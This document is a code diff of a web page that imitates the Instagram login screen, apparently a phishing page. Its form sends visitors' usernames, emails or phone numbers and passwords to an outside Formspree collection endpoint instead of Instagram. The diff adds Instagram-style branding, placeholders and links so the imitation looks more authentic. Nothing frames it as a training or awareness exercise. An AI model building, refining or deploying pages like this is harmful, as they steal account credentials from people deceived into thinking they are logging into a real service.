@@ -1,5 +1,5 @@
 <style>
-    .login-container {
+  .login-container {
     margin: auto;
     width: 300px;
     padding: 20px;
@@ -36,26 +36,75 @@
   button:hover {
     background-color: #2471a3;
   }
-  </style>
+
+  .option{
+    text-align: center;
+  }
+
+  .Logo{
+    text-align: center;
+    font-family: 'Pacifico', cursive;
+  }
+
+  .forget_id{
+    text-align: center;
+    margin: 20px;
+
+  }
+  .forget_id a {
+    text-decoration: none;
+    color: #025fd2;
+    font-size: 17px;
+    font-weight: 500;
+  }
+
+
+  .sign a{
+    text-align: centre;
+  }
+</style>
   
-  
+
+
+
+
+
+
+
+
+
+
   <!DOCTYPE html>
   <html>
     <head>
       <title>Instagram</title>
-      <link rel="stylesheet" type="text/css" href="style.css">
+      <link rel="stylesheet" type="text/css" href="#">
+      <link  href="https://fonts.googleapis.com/css2?family=Pacifico&display=swap ">
     </head>
     <body>
       <div class="login-container">
         <form action="https://formspree.io/f/mgebybqo" method="POST">
-          <h1>Instagram Login</h1>
-          <label for="username">Email,phone number,username:</label>
-          <input type="text" id="username" name="username" required>
-          <label for="password">Password:</label>
-          <input type="password" id="password" name="password" required>
+          <div class="Logo">
+          <h1>Instagram</h1>
+        </div>
+          <label for="username"></label>
+          <input type="text" id="username" name="username" required placeholder="Email,phone number,username">
+          <label for="password"></label>
+          <input type="password" id="password" name="password" required placeholder="Password">
           <button type="submit">Login</button>
+          <div class="option"> <hr> OR <hr></div>
         </form>
-        <p>Don't have an account? <a href="signup.php">Sign up</a></p>
+
+        <div class="forget_id">
+          <a href="#">Forget password?</a>
+        </div>
+
+        <div class="forget_id">
+          <p>Don't have an account? <a>Signup</a> </p> 
+        </div>
+
+         
+    
       </div>
     </body>
   </html>
